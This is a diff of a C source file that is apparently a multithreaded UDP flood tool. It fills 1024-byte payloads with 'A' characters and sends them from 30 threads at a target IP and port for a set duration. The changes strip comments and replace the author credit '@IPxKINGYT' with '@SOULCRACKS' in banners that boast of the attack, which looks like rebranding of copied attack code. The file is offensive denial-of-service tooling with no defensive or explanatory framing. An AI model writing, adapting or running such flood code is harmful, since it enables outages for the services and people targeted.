@@ -7,7 +7,7 @@
 #include <time.h>
 
 #define MAX_THREADS 30
-#define PAYLOAD_SIZE 1024  // Payload size in bytes
+#define PAYLOAD_SIZE 1024
 
 typedef struct {
     char ip[16];
@@ -21,11 +21,10 @@ void* send_payload(void* arg) {
     struct sockaddr_in server_addr;
     char payload[PAYLOAD_SIZE];
 
-    // Create a large payload to simulate high ping
     memset(payload, 'A', PAYLOAD_SIZE - 1);
     payload[PAYLOAD_SIZE - 1] = '\0';
 
-    sock = socket(AF_INET, SOCK_DGRAM, 0); // UDP socket
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
         perror("Socket creation failed");
         pthread_exit(NULL);
@@ -60,7 +59,7 @@ int main(int argc, char* argv[]) {
 
     pthread_t threads[MAX_THREADS];
 
-    printf("MADE BY @IPxKINGYT %s:%d for %d seconds with %d threads...\n",
+    printf("MADE BY @SOULCRACKS %s:%d for %d seconds with %d threads...\n",
            params.ip, params.port, params.duration, MAX_THREADS);
 
     for (int i = 0; i < MAX_THREADS; i++) {
@@ -73,7 +72,7 @@ int main(int argc, char* argv[]) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("FUCKED ATTACK @IPxKINGYT HOST IP %s on port %d for %d seconds\n",
+    printf("FUCKED ATTACK @SOULCRACKS HOST IP %s on port %d for %d seconds\n",
            params.ip, params.port, params.duration);
 
     return 0;
